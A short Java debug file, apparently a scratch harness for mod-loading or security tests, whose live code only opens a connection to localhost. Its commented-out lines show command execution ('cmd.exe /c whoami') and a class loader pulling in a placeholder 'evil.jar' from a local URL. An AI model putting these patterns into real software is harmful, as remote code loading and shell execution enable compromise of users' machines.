package dev.coconut.debug;

import java.net.URL;

public class Debug {

//    private static final class Test extends URLClassLoader {
//        private Test(URL[] urls, ClassLoader parent) {
//            super(urls, parent);
//        }
//
//        private void add(URL url) {
//            super.addURL(url);
//        }
//    }

    public static void main(String[] args) {
//        System.out.println("Mod init state: M0");
        try {
//            Runtime.getRuntime().exec("cmd.exe /c whoami");
//            try (Test loader = new Test(new URL[0], Debug.class.getClassLoader())) {
//                loader.add(new URL("https://localhost:8080/evil.jar"));
//            }
            URL test = new URL("https://localhost:1337");
//            test.openConnection();
            test.openStream();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
